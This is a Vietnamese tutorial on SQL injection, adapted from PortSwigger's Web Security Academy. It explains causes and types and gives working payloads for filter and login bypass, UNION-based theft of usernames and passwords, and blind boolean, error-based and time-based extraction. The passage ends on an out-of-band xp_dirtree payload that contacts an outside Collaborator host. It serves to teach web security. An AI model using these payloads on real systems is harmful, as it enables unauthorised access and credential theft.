# SQL Injection (SQLi)

> **Cre:** [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)

---

## 1. Lỗ hổng SQL Injection là gì?

### 1.1. Định nghĩa
**SQL Injection (SQLi)** là một lỗ hổng an ninh web cho phép kẻ tấn công can thiệp trực tiếp vào các câu truy vấn mà ứng dụng gửi đến cơ sở dữ liệu (Database).

Lỗ hổng này cho phép kẻ tấn công:
* Xem dữ liệu nhạy cảm mà bình thường họ không có quyền xem (dữ liệu của người dùng khác, thông tin kinh doanh bí mật).
* Chỉnh sửa hoặc xóa dữ liệu, làm thay đổi vĩnh viễn nội dung và hành vi của hệ thống.
* Leo thang đặc quyền để chiếm quyền điều khiển máy chủ backend hoặc hạ tầng bên dưới.
* Tấn công từ chối dịch vụ (DoS) làm sập hệ thống cơ sở dữ liệu.

### 1.2. Mức độ tác động (Impact)
Một cuộc tấn công SQLi thành công có thể dẫn đến rò rỉ:
* Mật khẩu đăng nhập (dưới dạng băm hoặc bản rõ).
* Thông tin thẻ tín dụng, tài khoản ngân hàng.
* Dữ liệu định danh cá nhân (PII - Personally Identifiable Information).

Trong lịch sử, SQLi là nguyên nhân của nhiều vụ vi phạm dữ liệu chấn động thế giới, gây thiệt hại nghiêm trọng về uy tín và khiến doanh nghiệp phải chịu các khoản phạt pháp lý khổng lồ. Kẻ tấn công thậm chí có thể cài cắm backdoor bền vững trên hệ thống trong thời gian dài mà không bị phát hiện.

---

## 2. Vì sao lỗ hổng tồn tại?

### 2.1. Bản chất: Nhập nhằng giữa “Lệnh” (Code) và “Dữ liệu” (Data)
Lỗ hổng phát sinh khi dữ liệu người dùng nhập vào được nối chuỗi trực tiếp (String Concatenation) vào câu lệnh SQL.

Trình phân tích cú pháp của database (SQL Parser) sử dụng các ký tự đặc biệt (như dấu nháy đơn `'`, dấu chấm phẩy `;`, dấu comment `--`) để phân tách các thành phần câu lệnh. Khi dữ liệu của người dùng chứa các ký tự này, database sẽ hiểu nhầm đó là cú pháp điều khiển của lập trình viên, từ đó thực thi dữ liệu đó như mã lệnh.

### 2.2. Phân loại theo cơ chế: First-order vs Second-order SQLi
* **First-order SQLi:** Input độc hại từ HTTP request được đưa trực tiếp vào câu lệnh SQL và thực thi ngay lập tức trong cùng chu kỳ xử lý request đó.
* **Second-order SQLi (Stored SQLi):**
  * Input độc hại ban đầu được lưu trữ vào database mà chưa gây hại gì (thường do lúc lưu có dùng hàm lọc cơ bản).
  * Ở một chức năng khác sau này, ứng dụng đọc dữ liệu đã lưu từ database ra và tin tưởng sai lầm rằng dữ liệu trong database là “an toàn”.
  * Ứng dụng nối chuỗi dữ liệu này vào một câu truy vấn SQL mới → Lỗ hổng lúc này mới phát tác.

---

## 3. Vị trí xuất hiện & Các dạng khai thác chi tiết
SQL Injection có thể xuất hiện ở bất kỳ đâu tiếp nhận dữ liệu đưa vào câu SQL:
* **Trong câu lệnh `SELECT`:** Tại mệnh đề `WHERE`, tên cột, tên bảng, hoặc mệnh đề `ORDER BY`.
* **Trong câu lệnh `UPDATE`:** Tại giá trị cập nhật (`SET col = '...'`) hoặc điều kiện `WHERE`.
* **Trong câu lệnh `INSERT`:** Tại danh sách giá trị (`VALUES ('...')`).

---

## 4. SQL injection examples
Có nhiều lỗ hổng, cách tấn công, kĩ thuật SQLi xảy ra trong những tình huống khác nhau. Một vài ví dụ phổ biến về SQL injection bao gồm:

### Dạng 1: Đọc dữ liệu ẩn (Retrieving hidden data)

* **Ngữ cảnh:** Trang web bán hàng lọc sản phẩm theo danh mục (`category`), nhưng chỉ hiển thị các sản phẩm đã mở bán (`released = 1`).
* **URL gửi đi:** `https://insecure-website.com/products?category=Gifts`
* **Truy vấn gốc:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

#### 📌 Kỹ thuật 1A: Dùng dấu Comment `--`
* **URL tấn công:** `https://insecure-website.com/products?category=Gifts'--`
* **Câu SQL sau khi bị can thiệp:**
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
* **🔍 Phân tích chi tiết từng thành phần Payload `Gifts'--`:**

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `Gifts` | Giá trị danh mục hợp lệ ban đầu. |
| `'` | Dấu nháy đơn dùng để đóng chuỗi ký tự của tham số `category` sớm hơn dự định. |
| `--` | Ký hiệu bắt đầu chú thích (Comment) trong SQL. Toàn bộ phần phía sau (`' AND released = 1`) bị loại bỏ hoàn toàn khỏi quá trình thực thi. |

* **Kết quả:** Truy vấn chỉ còn `WHERE category = 'Gifts'`, hiển thị toàn bộ sản phẩm thuộc nhóm Gifts kể cả khi chưa phát hành (`released = 0`).

#### 📌 Kỹ thuật 1B: Ép điều kiện luôn đúng (`OR 1=1`)
* **URL tấn công:** `https://insecure-website.com/products?category=Gifts'+OR+1=1--`
* **Câu SQL sau khi bị can thiệp:**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
* **🔍 Phân tích chi tiết từng thành phần Payload `Gifts'+OR+1=1--`:**

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `Gifts` | Giá trị danh mục ban đầu. |
| `'` | Đóng chuỗi literal mà server mở ra cho giá trị `$category`. |
| `+` | Đại diện cho khoảng trắng (Space) được mã hóa URL giữa các từ khóa. |
| `OR` | Toán tử logic SQL. Chỉ cần một trong hai vế đúng thì toàn bộ mệnh đề `WHERE` đúng. |
| `1=1` | Biểu thức toán học luôn trả về TRUE với mọi hàng dữ liệu trong bảng. |
| `--` | Vô hiệu hóa toàn bộ đoạn mã phía sau (`' AND released = 1`). |

* **Kết quả:** Do `1=1` luôn đúng, câu lệnh trả về tất cả sản phẩm của mọi danh mục trong hệ thống, bao gồm cả sản phẩm bị ẩn.

> ⚠️ **Cảnh báo an toàn khi pentest:** Hết sức thận trọng khi inject `OR 1=1`. Nếu giá trị bạn nhập được hệ thống tái sử dụng trong một câu lệnh `UPDATE` hoặc `DELETE`, điều kiện `OR 1=1` có thể cập nhật hoặc xóa sạch toàn bộ dữ liệu của cả bảng!

---

### Dạng 2: Phá vỡ logic ứng dụng (Bypass xác thực đăng nhập)

* **Ngữ cảnh:** Ứng dụng kiểm tra username và password của người dùng.
* **Truy vấn gốc:**
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

#### 📌 Kỹ thuật khai thác:
Người dùng nhập vào ô Username: `administrator'--` và để trống ô Password.

* **Câu SQL sau khi bị can thiệp:**
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
* **🔍 Phân tích chi tiết từng thành phần Payload `administrator'--`:**

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `administrator` | Tên tài khoản quản trị viên mục tiêu cần chiếm quyền. |
| `'` | Đóng chuỗi giá trị của `username`. |
| `--` | Comment toàn bộ phần kiểm tra mật khẩu phía sau (`AND password = '...'`). |

* **Kết quả:** Server thực thi câu lệnh `SELECT * FROM users WHERE username = 'administrator'`, tìm thấy tài khoản admin và cho phép đăng nhập thẳng mà không cần mật khẩu.

---

### Dạng 3: Tấn công kết hợp bảng (UNION-based SQLi)

Khi một ứng dụng dễ bị tấn công SQL injection, và kết quả truy vấn được trả về trong phản hồi của ứng dụng, bạn có thể sử dụng từ khóa `UNION` để truy xuất dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này thường được gọi là tấn công SQL injection UNION.

Từ khóa `UNION` này cho phép bạn thực hiện một hoặc nhiều truy vấn `SELECT` bổ sung và thêm kết quả vào truy vấn ban đầu. Ví dụ:
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
Truy vấn SQL này trả về một tập kết quả duy nhất với hai cột, chứa các giá trị từ các cột `a` và `b` trong `table1` và các cột `c` và `d` trong `table2`.

Để truy vấn `UNION` hoạt động, cần đáp ứng **hai yêu cầu chính**:
1. Các truy vấn riêng lẻ phải trả về **cùng số lượng cột**.
2. Các **kiểu dữ liệu trong mỗi cột phải tương thích** giữa các truy vấn riêng lẻ.

Để thực hiện tấn công SQL injection UNION, hãy đảm bảo cuộc tấn công của bạn đáp ứng hai yêu cầu này. Điều này thường bao gồm việc tìm hiểu:
* Truy vấn ban đầu trả về bao nhiêu cột?
* Những cột nào được trả về từ truy vấn gốc có kiểu dữ liệu phù hợp để chứa kết quả từ truy vấn được chèn vào?

#### 📌 Ví dụ tấn công kết hợp bảng cơ bản
Khi ứng dụng hiển thị trực tiếp kết quả truy vấn ra màn hình, ta có thể dùng từ khóa `UNION` để ghép thêm một truy vấn mới nhằm rút trích dữ liệu từ các bảng khác.

* **Truy vấn gốc:**
```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```
* **Payload tấn công:**
```sql
' UNION SELECT username, password FROM users--
```
* **🔍 Phân tích chi tiết từng thành phần Payload:**

| Thành phần | Ý nghĩa & Cơ chế hoạt động |
| :--- | :--- |
| `'` | Đóng chuỗi giá trị danh mục ban đầu. |
| `UNION` | Toán tử gộp tập hợp kết quả của câu SELECT ban đầu với câu SELECT mới. |
| `SELECT username, password` | Lấy dữ liệu 2 cột tài khoản và mật khẩu (số cột phải bằng đúng số cột `name`, `description` của truy vấn gốc). |
| `FROM users` | Chỉ định bảng cần đánh cắp dữ liệu (`users`). |
| `--` | Bỏ qua phần còn lại của câu lệnh gốc. |

* **Kết quả:** Trang web sẽ hiển thị danh sách `username` và `password` của toàn bộ người dùng xen kẽ với danh sách sản phẩm.

---

#### 3.1. Xác định số lượng cột cần thiết

Khi thực hiện tấn công SQL injection UNION, có hai phương pháp hiệu quả để xác định số lượng cột được trả về từ truy vấn gốc.

##### Phương pháp 1: Sử dụng mệnh đề `ORDER BY`
Một phương pháp là chèn một loạt các mệnh đề `ORDER BY` và tăng chỉ số cột được chỉ định cho đến khi xảy ra lỗi. Ví dụ, nếu điểm chèn là một chuỗi được đặt trong dấu ngoặc kép bên trong mệnh đề `WHERE` của truy vấn gốc, bạn sẽ gửi:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# etc.
```

Chuỗi tải trọng này sửa đổi truy vấn gốc để sắp xếp kết quả theo các cột khác nhau trong tập kết quả. Cột trong mệnh đề `ORDER BY` có thể được chỉ định bằng chỉ mục của nó, vì vậy bạn không cần biết tên của bất kỳ cột nào. Khi chỉ mục cột được chỉ định vượt quá số lượng cột thực tế trong tập kết quả, cơ sở dữ liệu sẽ trả về lỗi, ví dụ:
```text
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

Ứng dụng có thể thực sự trả về lỗi cơ sở dữ liệu trong phản hồi HTTP của nó, nhưng nó cũng có thể đưa ra một phản hồi lỗi chung chung. Trong những trường hợp khác, nó có thể đơn giản là không trả về kết quả nào cả. Dù bằng cách nào, miễn là bạn có thể phát hiện ra một số khác biệt trong phản hồi, bạn có thể suy ra có bao nhiêu cột đang được trả về từ truy vấn.

##### Phương pháp 2: Sử dụng `UNION SELECT NULL`
Phương pháp thứ hai bao gồm việc gửi một loạt các gói dữ liệu `UNION SELECT` chỉ định số lượng giá trị `NULL` khác nhau:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# etc.
```

Nếu số lượng giá trị `NULL` không khớp với số lượng cột, cơ sở dữ liệu sẽ trả về lỗi, ví dụ như:
```text
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Chúng tôi sử dụng các giá trị `NULL` trả về từ truy vấn `SELECT` được chèn vì kiểu dữ liệu trong mỗi cột phải tương thích giữa truy vấn gốc và truy vấn được chèn. Kiểu dữ liệu `NULL` này có thể chuyển đổi sang mọi kiểu dữ liệu phổ biến, do đó nó tối đa hóa khả năng thành công của tải trọng khi số lượng cột chính xác.

Cũng giống như kỹ thuật `ORDER BY`, ứng dụng có thể thực sự trả về lỗi cơ sở dữ liệu trong phản hồi HTTP của nó, nhưng có thể trả về lỗi chung chung hoặc đơn giản là không trả về kết quả nào. Khi số lượng giá trị null khớp với số lượng cột, cơ sở dữ liệu sẽ trả về một hàng bổ sung trong tập kết quả, chứa các giá trị null trong mỗi cột. Ảnh hưởng đến phản hồi HTTP phụ thuộc vào mã của ứng dụng. Nếu may mắn, bạn sẽ thấy một số nội dung bổ sung trong phản hồi, chẳng hạn như một hàng bổ sung trên bảng HTML. Nếu không, các giá trị null có thể gây ra một lỗi khác, chẳng hạn như lỗi `NullPointerException`. Trong trường hợp xấu nhất, phản hồi có thể trông giống như phản hồi do số lượng giá trị null không chính xác gây ra. Điều này sẽ làm cho phương pháp này không hiệu quả.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Tấn công SQL injection UNION, xác định số lượng cột được trả về bởi truy vấn.](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) *(Chưa được giải quyết)*

##### Cú pháp dành riêng cho cơ sở dữ liệu
* **Trên Oracle:** Mọi truy vấn `SELECT` đều phải sử dụng từ khóa `FROM` và chỉ định một bảng hợp lệ. Có một bảng tích hợp sẵn trên Oracle có tên là `dual` có thể được sử dụng cho mục đích này. Vì vậy, các truy vấn được chèn vào Oracle sẽ cần có dạng như sau:
```sql
' UNION SELECT NULL FROM DUAL--
```
* **Trên MySQL:** Các payload được mô tả sử dụng chuỗi chú thích hai dấu gạch ngang `--` để vô hiệu hóa phần còn lại của truy vấn gốc sau điểm chèn. Trên MySQL, chuỗi hai dấu gạch ngang phải được theo sau bởi một khoảng trắng (`-- `). Ngoài ra, ký tự dấu thăng `#` cũng có thể được sử dụng để xác định một chú thích.

Để biết thêm chi tiết về cú pháp cụ thể của cơ sở dữ liệu, hãy xem [bảng tóm tắt tấn công SQL injection](https://portswigger.net/web-security/sql-injection/cheat-sheet).

---

#### 3.2. Tìm các cột có kiểu dữ liệu hữu ích

Tấn công SQL injection UNION cho phép bạn truy xuất kết quả từ một truy vấn bị chèn. Dữ liệu cần truy xuất thường ở dạng chuỗi. Điều này có nghĩa là bạn cần tìm một hoặc nhiều cột trong kết quả truy vấn gốc có kiểu dữ liệu là, hoặc tương thích với, dữ liệu chuỗi.

Sau khi xác định số lượng cột cần thiết, bạn có thể kiểm tra từng cột để xem liệu nó có thể chứa dữ liệu chuỗi hay không. Bạn có thể gửi một loạt các payload `UNION SELECT` để đặt giá trị chuỗi vào từng cột một. Ví dụ, nếu truy vấn trả về bốn cột, bạn sẽ gửi:
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Nếu kiểu dữ liệu của cột không tương thích với dữ liệu chuỗi, truy vấn được chèn sẽ gây ra lỗi cơ sở dữ liệu, ví dụ như:
```text
Conversion failed when converting the varchar value 'a' to data type int.
```

Nếu không xảy ra lỗi và phản hồi của ứng dụng chứa một số nội dung bổ sung bao gồm giá trị chuỗi được chèn, thì cột liên quan phù hợp để truy xuất dữ liệu chuỗi.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Tấn công SQL injection UNION, tìm kiếm một cột chứa văn bản](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) *(Chưa được giải quyết)*

---

#### 3.3. Sử dụng tấn công SQL injection UNION để lấy dữ liệu thú vị

Khi bạn đã xác định được số lượng cột được trả về bởi truy vấn ban đầu và tìm ra những cột nào có thể chứa dữ liệu chuỗi, bạn đã có thể truy xuất dữ liệu cần thiết.

Giả sử rằng:
* Truy vấn ban đầu trả về hai cột, cả hai đều có thể chứa dữ liệu dạng chuỗi.
* Điểm chèn là một chuỗi ký tự được đặt trong dấu ngoặc kép bên trong mệnh đề `WHERE`.
* Cơ sở dữ liệu chứa một bảng có tên là `users` với các cột `username` và `password`.

Trong ví dụ này, bạn có thể truy xuất nội dung của bảng `users` bằng cách nhập dữ liệu:
```sql
' UNION SELECT username, password FROM users--
```

Để thực hiện cuộc tấn công này, bạn cần biết rằng có một bảng có tên là `users` với hai cột có tên là `username` và `password`. Nếu không có thông tin này, bạn sẽ phải đoán tên của các bảng và cột. Tất cả các cơ sở dữ liệu hiện đại đều cung cấp các cách để kiểm tra cấu trúc cơ sở dữ liệu và xác định các bảng và cột mà chúng chứa.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Tấn công SQL injection UNION, truy xuất dữ liệu từ các bảng khác.](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) *(Chưa được giải quyết)*

##### Đọc thêm:
* [Kiểm tra cơ sở dữ liệu trong các cuộc tấn công SQL injection](https://portswigger.net/web-security/sql-injection/examining-the-database)

---

#### 3.4. Truy xuất nhiều giá trị trong cùng một cột

Trong một số trường hợp, truy vấn trong ví dụ trước có thể chỉ trả về một cột duy nhất.

Bạn có thể truy xuất nhiều giá trị cùng lúc trong một cột duy nhất bằng cách nối các giá trị lại với nhau. Bạn có thể thêm dấu phân cách để phân biệt các giá trị đã kết hợp. Ví dụ, trên Oracle, bạn có thể nhập dữ liệu như sau:
```sql
' UNION SELECT username || '~' || password FROM users--
```

Phương pháp này sử dụng chuỗi dấu gạch dọc kép `||`, là một toán tử nối chuỗi trên Oracle. Truy vấn được chèn sẽ nối các giá trị của trường `username` và `password` lại với nhau, được phân tách bởi ký tự `~`.

Kết quả truy vấn bao gồm tất cả tên người dùng và mật khẩu, ví dụ:
```text
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Các cơ sở dữ liệu khác nhau sử dụng cú pháp khác nhau để thực hiện nối chuỗi. Để biết thêm chi tiết, hãy xem [bảng hướng dẫn tấn công SQL injection](https://portswigger.net/web-security/sql-injection/cheat-sheet).

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Tấn công SQL injection UNION, truy xuất nhiều giá trị trong một cột duy nhất.](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) *(Chưa được giải quyết)*

---

### Dạng 4: Lỗ hổng Blind SQL Injection (Blind SQL injection vulnerabilities)

#### Khái niệm (What is blind SQL injection?)
**Blind SQL Injection (SQLi mù)** xảy ra khi ứng dụng có lỗ hổng SQL injection, nhưng các phản hồi HTTP (HTTP responses) của ứng dụng **không chứa kết quả** của câu truy vấn SQL liên quan và cũng **không hiển thị chi tiết** của bất kỳ lỗi cơ sở dữ liệu nào.

Nhiều kỹ thuật thông thường như **tấn công `UNION` (UNION attacks) sẽ không hiệu quả** đối với các lỗ hổng Blind SQL Injection. Nguyên nhân là vì tấn công UNION phụ thuộc vào việc bạn phải nhìn thấy kết quả của câu truy vấn chèn vào ngay trong phản hồi của ứng dụng. Mặc dù vậy, ta vẫn hoàn toàn có thể khai thác Blind SQLi để truy cập dữ liệu trái phép thông qua các kỹ thuật chuyên sâu dưới đây:

---

#### 4.1. Khai thác Blind SQLi bằng phản hồi có điều kiện (Triggering conditional responses)

Xét một ứng dụng sử dụng tracking cookie để thu thập dữ liệu phân tích về hành vi người dùng. Request gửi đến ứng dụng chứa một header cookie có dạng:
```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Khi request chứa cookie `TrackingId` được xử lý, ứng dụng thực thi một câu truy vấn SQL để kiểm tra xem đây có phải là người dùng đã biết hay không:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Câu truy vấn này bị dính lỗ hổng SQL injection, nhưng kết quả truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng lại có **hành vi khác biệt** tùy thuộc vào việc câu truy vấn có trả về bản ghi nào hay không:
* Nếu `TrackingId` hợp lệ và tồn tại trong bảng, câu truy vấn trả về dữ liệu $\rightarrow$ ứng dụng hiển thị thông điệp `"Welcome back"` trên trang.
* Nếu `TrackingId` không tồn tại, câu truy vấn không trả về dữ liệu $\rightarrow$ thông điệp `"Welcome back"` không xuất hiện.

Hành vi này là đủ để chúng ta khai thác lỗ hổng Blind SQLi bằng cách kích hoạt các phản hồi khác nhau tùy theo điều kiện được chèn vào.

##### Cơ chế hoạt động:
Gửi lần lượt 2 request chứa giá trị cookie `TrackingId` như sau:
```sql
...xyz' AND '1'='1
...xyz' AND '1'='2
```
* **Giá trị đầu tiên (`AND '1'='1`):** Điều kiện luôn đúng (True), câu lệnh trả về kết quả $\rightarrow$ Thông điệp `"Welcome back"` xuất hiện.
* **Giá trị thứ hai (`AND '1'='2`):** Điều kiện sai (False), câu lệnh không trả về kết quả $\rightarrow$ Thông điệp `"Welcome back"` biến mất.

Điều này cho phép kẻ tấn công kiểm tra tính đúng/sai của bất kỳ biểu thức Boolean nào và **trích xuất dữ liệu từng ký tự một (Blind Boolean-based)**.

##### Kỹ thuật dò tìm mật khẩu từng ký tự:
Giả sử có bảng `Users` chứa các cột `Username` và `Password`, với tài khoản quản trị viên là `Administrator`:

1. **Bước 1: Kiểm tra ký tự đầu tiên có lớn hơn `'m'` hay không:**
   ```sql
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
   ```
   Nếu server trả về thông điệp `"Welcome back"` $\rightarrow$ Ký tự đầu tiên nằm trong khoảng từ `n` đến `z`.

2. **Bước 2: Thu hẹp khoảng tìm kiếm (kiểm tra có lớn hơn `'t'` không):**
   ```sql
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
   ```
   Nếu server không trả về `"Welcome back"` $\rightarrow$ Ký tự đầu tiên nằm trong khoảng từ `n` đến `t`.

3. **Bước 3: Xác định chính xác ký tự:**
   ```sql
   xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
   ```
   Server trả về `"Welcome back"` $\rightarrow$ Xác nhận chính xác ký tự đầu tiên của mật khẩu là `'s'`.

Tiếp tục quá trình này cho vị trí thứ 2, 3, 4... để lấy toàn bộ mật khẩu của `Administrator`.

> 💡 **Lưu ý:** Hàm `SUBSTRING` có thể được gọi là `SUBSTR` trên một số hệ quản trị cơ sở dữ liệu như Oracle.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) *(Chưa được giải quyết)*

---

#### 4.2. Khai thác dựa trên thông báo lỗi (Error-based SQL injection)

**Error-based SQL injection** đề cập đến các trường hợp bạn có thể sử dụng thông báo lỗi của cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, ngay cả trong ngữ cảnh Blind:

##### 4.2.1. Suy luận thông tin bằng lỗi có điều kiện (Triggering conditional errors)
Nhiều ứng dụng thực thi câu truy vấn SQL nhưng giao diện phản hồi hoàn toàn không thay đổi dù truy vấn có trả về dữ liệu hay không. Khi đó, kỹ thuật Boolean ở mục 4.1 sẽ không hiệu quả.

Tuy nhiên, ta có thể khiến ứng dụng trả về phản hồi khác biệt nếu **phát sinh lỗi cơ sở dữ liệu**. Ta điều chỉnh câu truy vấn sao cho nó **chỉ gây ra lỗi database khi điều kiện kiểm tra là ĐÚNG**. Một lỗi chưa được xử lý (unhandled error) sẽ làm server trả về mã lỗi HTTP 500 hoặc thông báo lỗi, từ đó suy đoán được tính đúng/sai.

###### Kỹ thuật ép lỗi chia cho 0 với biểu thức `CASE`:
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
* **Payload 1 (`1=2` sai):** Biểu thức `CASE` trả về `'a'` $\rightarrow$ Không có lỗi nào xảy ra $\rightarrow$ Server trả về HTTP 200 bình thường.
* **Payload 2 (`1=1` đúng):** Biểu thức `CASE` thực thi `1/0` (lỗi chia cho 0) $\rightarrow$ Server phát sinh lỗi cơ sở dữ liệu $\rightarrow$ Trả về HTTP 500 Internal Server Error.

###### Ứng dụng dò tìm mật khẩu:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
Nếu server phản hồi HTTP 500 $\rightarrow$ Ký tự đầu tiên lớn hơn `'m'`.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) *(Chưa được giải quyết)*

---

##### 4.2.2. Trích xuất dữ liệu nhạy cảm qua thông báo lỗi chi tiết (Verbose SQL error messages)
Cấu hình sai sót của cơ sở dữ liệu đôi khi làm lộ các thông báo lỗi chi tiết (Verbose error messages). Các thông báo này có thể làm lộ thông tin hữu ích:

* **Lộ cấu trúc câu truy vấn gốc:**
  Khi chèn một dấu nháy đơn `'` vào tham số `id`:
  ```text
  Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
  ```
  Thông báo lỗi này in ra toàn bộ câu truy vấn gốc, giúp kẻ tấn công biết chính xác vị trí injection để đóng chuỗi cú pháp hợp lệ.

* **Ép database in dữ liệu nhạy cảm vào thông báo lỗi bằng hàm `CAST()`:**
  Hàm `CAST()` cho phép chuyển đổi kiểu dữ liệu. Nếu bạn ép database chuyển đổi một chuỗi văn bản (dữ liệu cần đọc) sang kiểu số nguyên (`int`), database sẽ báo lỗi và **in luôn giá trị của chuỗi đó vào thông báo lỗi**:
  ```sql
  CAST((SELECT example_column FROM example_table) AS int)
  ```
  Thông báo lỗi trả về từ database:
  ```text
  ERROR: invalid input syntax for type integer: "Example data"
  ```
  Dữ liệu bí mật `"Example data"` đã bị in thẳng ra thông báo lỗi! Kỹ thuật này biến một lỗ hổng Blind SQLi thành một lỗ hổng hiển thị dữ liệu trực tiếp vô cùng nhanh chóng.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based) *(Chưa được giải quyết)*

---

#### 4.3. Khai thác Blind SQLi bằng độ trễ thời gian (Triggering time delays / Time-based)

Nếu ứng dụng bắt và xử lý gọn gàng các lỗi cơ sở dữ liệu (try-catch graceful handling), các phản hồi HTTP sẽ không có gì khác biệt khi xảy ra lỗi. Khi đó cả kỹ thuật Boolean lẫn Conditional Errors đều không áp dụng được.

Trong tình huống này, ta có thể khai thác lỗ hổng bằng cách **kích hoạt độ trễ thời gian (Time Delay)** dựa trên điều kiện đúng/sai. Vì các truy vấn SQL thường được xử lý đồng bộ (synchronously), việc làm chậm truy vấn SQL sẽ làm chậm toàn bộ thời gian phản hồi HTTP của ứng dụng.

##### Ví dụ trên Microsoft SQL Server (`WAITFOR DELAY`):
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
* **Payload 1 (`1=2` sai):** Phản hồi ngay lập tức (0 giây).
* **Payload 2 (`1=1` đúng):** Phản hồi trễ chính xác sau 10 giây.

##### Trích xuất dữ liệu bằng kỹ thuật Time-based:
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```
Nếu response phản hồi trễ 10 giây $\rightarrow$ Ký tự đầu tiên lớn hơn `'m'`.

> 🧪 **PHÒNG THÍ NGHIỆM | NGƯỜI THỰC HÀNH:**  
> 1. [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) *(Chưa được giải quyết)*  
> 2. [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval) *(Chưa được giải quyết)*

---

#### 4.4. Khai thác Blind SQLi bằng kỹ thuật mạng ngoài luồng (Out-of-band / OAST techniques)

Một số ứng dụng thực thi câu truy vấn SQL theo cơ chế **bất đồng bộ (Asynchronous)**. Ứng dụng tiếp tục phản hồi người dùng trên luồng chính (thread ban đầu), đồng thời mở một luồng ngầm riêng để xử lý cookie và thực thi câu truy vấn SQL. Trong trường hợp này:
* Ứng dụng không thay đổi phản hồi dù có dữ liệu hay không.
* Lỗi database không ảnh hưởng đến phản hồi.
* Thời gian trễ của câu SQL cũng không làm trễ phản hồi HTTP của luồng chính.

Tất cả các kỹ thuật trên đều bất khả thi. Cách duy nhất để khai thác là kích hoạt **tương tác mạng ngoài luồng (Out-of-band Network Interaction)** gửi tới một máy chủ do kẻ tấn công kiểm soát.

##### Giao thức DNS - Kênh truyền ngoài luồng hiệu quả nhất:
Giao thức mạng hiệu quả nhất cho mục đích này là **DNS**. Hầu hết các hệ thống mạng doanh nghiệp (production networks) đều cho phép các truy vấn DNS đi ra ngoài (egress DNS) vì đây là giao thức thiết yếu để máy chủ phân giải tên miền.

##### Công cụ hỗ trợ: Burp Collaborator
Công cụ dễ dàng và tin cậy nhất để khai thác OAST là **Burp Collaborator**. Đây là một máy chủ chuyên dụng cung cấp các dịch vụ mạng như DNS, HTTP, SMTP... cho phép bạn phát hiện ngay lập tức khi ứng dụng mục tiêu gửi truy vấn mạng ra bên ngoài.

##### 1. Kích hoạt truy vấn DNS (Ví dụ trên Microsoft SQL Server):
Sử dụng stored procedure `master..xp_dirtree` để buộc server thực hiện truy vấn phân giải tên miền tới domain Collaborator:
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Database engine sẽ gửi một DNS request phân giải domain:
```text
